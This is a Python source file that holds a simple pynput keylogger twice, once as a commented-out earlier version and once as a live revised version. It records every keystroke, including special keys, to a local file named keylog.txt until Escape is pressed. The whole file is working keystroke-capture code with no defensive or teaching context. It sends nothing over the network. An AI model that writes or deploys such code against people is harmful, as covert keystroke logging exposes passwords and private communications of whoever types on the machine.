# from pynput import keyboard
# import time

# logfile = "keylog.txt"

# def write_log(logfile, log):
#     with open(logfile, "a") as writer:
#         writer.write(log)

# def on_press(key):
#     try:
#         log = ""
#         if key == keyboard.Key.backspace:
#             log = "[B]"
#         elif key == keyboard.Key.enter:
#             log = "\n"
#         elif key == keyboard.Key.space:
#             log = " "
#         elif key == keyboard.Key.esc:
#             log = "\n=========================================\nExiting"
#             return False
#         else:
#             log = str(key).replace("'", "")

#         write_log(logfile, log)

#     except Exception as e:
#         print("[ERROR] An error occurred:", str(e))

# def on_release(key):
#     if key == keyboard.Key.esc:
#         print('Exiting...')
#         return False

# if __name__ == "__main__":
#     print("[+] Keylogger started")
#     curr_time = time.ctime(time.time())
#     write_log(logfile, f"logs created on {curr_time}\n")
#     write_log(logfile, "=========================================================\n")

#     try:
#         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
#             listener.join()
#     except KeyboardInterrupt:
#         print("[+] Exiting")




from pynput import keyboard
import time

logfile = "keylog.txt"

def write_log(logfile, log):
    with open(logfile, "a") as writer:
        writer.write(log)

def on_press(key):
    try:
        log = ""
        if key == keyboard.Key.backspace:
            log = "[rm]"
        elif key == keyboard.Key.delete:
            log = "[del]"
        elif key == keyboard.Key.caps_lock:
            log = "[caps]"
        elif key == keyboard.Key.enter:
            log = "\n"
        elif key == keyboard.Key.space:
            log = " "
        elif key == keyboard.Key.esc:
            log = "\n=========================================\nExiting"
            return False
        else:
            log = str(key).replace("'", "").replace("Key.", "")

        write_log(logfile, log)

    except Exception as e:
        print("[ERROR] An error occurred:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        print('Exiting...')
        return False

if __name__ == "__main__":
    print("[+] Keylogger started")
    curr_time = time.ctime(time.time())
    write_log(logfile, f"Logs created on {curr_time}\n")
    write_log(logfile, "=========================================================\n")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("[+] Exiting")



